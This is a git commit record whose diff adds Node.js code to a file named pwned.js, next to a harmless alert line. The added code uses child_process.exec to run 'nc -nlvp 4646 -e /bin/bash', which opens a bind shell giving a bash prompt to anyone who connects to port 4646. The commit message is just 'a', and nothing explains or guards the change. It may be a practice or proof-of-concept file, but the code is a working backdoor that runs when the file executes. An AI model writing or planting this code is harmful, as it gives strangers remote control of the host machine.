7f5154c3e66578b5bbd257653ddb35b1f4328e0b
aitortxu20 <aitortxuboy@gmail.com>
2023-12-01 20:30:29 +0100

    a

--- pwned.js
+++ pwned.js
@@ -1,1 +1,15 @@
 alert("Hola");
+
+const { exec } = require('child_process');
+
+// Comando a ejecutar en Bash
+const comandoBash = 'nc -nlvp 4646 -e /bin/bash';
+
+// Ejecutar el comando en Bash desde Node.js
+exec(comandoBash, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error al ejecutar el comando: ${error}`);
+    return;
+  }
+  console.log(`Resultado del comando:\n${stdout}`);
+});
